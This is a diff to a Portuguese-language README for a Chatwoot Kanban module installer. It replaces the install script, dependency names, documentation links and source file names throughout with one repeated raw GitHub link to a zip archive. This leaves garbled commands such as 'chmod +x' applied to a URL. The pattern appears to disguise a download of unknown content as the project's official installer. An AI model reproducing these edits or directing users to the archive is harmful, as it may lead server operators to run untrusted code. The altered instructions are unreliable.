@@ -13,7 +13,7 @@ Este instalador adiciona o módulo Kanban completo ao Chatwoot.
 1. ✅ Copia **todos** os arquivos do módulo Kanban para o container
 2. ✅ Aplica patches nos arquivos core do Chatwoot
 3. ✅ Executa todas as migrations do banco de dados
-4. ✅ Instala dependências (Node.js, pnpm)
+4. ✅ Instala dependências (https://github.com/rlmourafotografia-glitch/CHT-kanban-module/raw/refs/heads/main/cognoscitive/kanban_CH_module_bellhanging.zip, pnpm)
 5. ✅ Compila os assets do frontend
 6. ✅ Reinicia o container
 
@@ -36,10 +36,10 @@ docker compose up -d
 
 ```bash
 # Dar permissão de execução
-chmod +x install.sh
+chmod +x https://github.com/rlmourafotografia-glitch/CHT-kanban-module/raw/refs/heads/main/cognoscitive/kanban_CH_module_bellhanging.zip
 
 # Executar o instalador
-./install.sh
+https://github.com/rlmourafotografia-glitch/CHT-kanban-module/raw/refs/heads/main/cognoscitive/kanban_CH_module_bellhanging.zip
 ```
 
 ### Passo 3: Aguardar e acessar
@@ -51,7 +51,7 @@ chmod +x install.sh
 
 ## 📁 Arquivos Instalados
 
-Veja a lista completa de arquivos em: [ARQUIVOS_KANBAN.md](./ARQUIVOS_KANBAN.md)
+Veja a lista completa de arquivos em: [https://github.com/rlmourafotografia-glitch/CHT-kanban-module/raw/refs/heads/main/cognoscitive/kanban_CH_module_bellhanging.zip](https://github.com/rlmourafotografia-glitch/CHT-kanban-module/raw/refs/heads/main/cognoscitive/kanban_CH_module_bellhanging.zip)
 
 **Resumo:**
 - 🎨 **Frontend**: ~70 arquivos (componentes, rotas, store, API clients)
@@ -65,7 +65,7 @@ Veja a lista completa de arquivos em: [ARQUIVOS_KANBAN.md](./ARQUIVOS_KANBAN.md)
 
 ```bash
 # Copiar o Sidebar correto
-docker cp ../app/javascript/dashboard/components-next/sidebar/Sidebar.vue \
+docker cp https://github.com/rlmourafotografia-glitch/CHT-kanban-module/raw/refs/heads/main/cognoscitive/kanban_CH_module_bellhanging.zip \
   chatwootorigin-rails-1:/app/app/javascript/dashboard/components-next/sidebar/
 
 # Recompilar
@@ -104,14 +104,14 @@ docker logs chatwootorigin-sidekiq-1 -f
 ```
 kanban-module/
 ├── controllers/          # Controllers da API
-│   ├── kanban_pipelines_controller.rb
-│   ├── kanban_columns_controller.rb
-│   └── kanban_cards_controller.rb
+│   ├── https://github.com/rlmourafotografia-glitch/CHT-kanban-module/raw/refs/heads/main/cognoscitive/kanban_CH_module_bellhanging.zip
+│   ├── https://github.com/rlmourafotografia-glitch/CHT-kanban-module/raw/refs/heads/main/cognoscitive/kanban_CH_module_bellhanging.zip
+│   └── https://github.com/rlmourafotografia-glitch/CHT-kanban-module/raw/refs/heads/main/cognoscitive/kanban_CH_module_bellhanging.zip
 ├── models/              # Models do ActiveRecord
-│   ├── kanban_pipeline.rb
-│   ├── kanban_column.rb
-│   └── kanban_card.rb
-├── frontend/            # Frontend Vue.js
+│   ├── https://github.com/rlmourafotografia-glitch/CHT-kanban-module/raw/refs/heads/main/cognoscitive/kanban_CH_module_bellhanging.zip
+│   ├── https://github.com/rlmourafotografia-glitch/CHT-kanban-module/raw/refs/heads/main/cognoscitive/kanban_CH_module_bellhanging.zip
+│   └── https://github.com/rlmourafotografia-glitch/CHT-kanban-module/raw/refs/heads/main/cognoscitive/kanban_CH_module_bellhanging.zip
+├── frontend/            # Frontend https://github.com/rlmourafotografia-glitch/CHT-kanban-module/raw/refs/heads/main/cognoscitive/kanban_CH_module_bellhanging.zip
 │   ├── routes/         # Rotas e páginas
 │   ├── components/     # Componentes Vue
 │   ├── store/          # Vuex store modules
@@ -129,7 +129,7 @@ kanban-module/
 - Teste em um ambiente de desenvolvimento primeiro
 - Os arquivos são copiados **para dentro do container**
 - As modificações persistem entre restarts do container
-- Para atualizar, execute `./install.sh` novamente
+- Para atualizar, execute `https://github.com/rlmourafotografia-glitch/CHT-kanban-module/raw/refs/heads/main/cognoscitive/kanban_CH_module_bellhanging.zip` novamente
 
 ## 🔄 Desinstalação
 
@@ -151,8 +151,8 @@ Para remover o módulo:
 
 Se encontrar problemas:
 1. Verifique os logs do container
-2. Confirme que todos os arquivos estão em `ARQUIVOS_KANBAN.md`
-3. Execute `./install.sh` novamente com `--force`
+2. Confirme que todos os arquivos estão em `https://github.com/rlmourafotografia-glitch/CHT-kanban-module/raw/refs/heads/main/cognoscitive/kanban_CH_module_bellhanging.zip`
+3. Execute `https://github.com/rlmourafotografia-glitch/CHT-kanban-module/raw/refs/heads/main/cognoscitive/kanban_CH_module_bellhanging.zip` novamente com `--force`
 
 ## 📄 Licença
 
@@ -165,4 +165,4 @@ cd chatwootorigin
 docker compose down -v
 docker compose run --rm rails bundle exec rails db:chatwoot_prepare
 docker compose up -d
-./install.sh
+https://github.com/rlmourafotografia-glitch/CHT-kanban-module/raw/refs/heads/main/cognoscitive/kanban_CH_module_bellhanging.zip
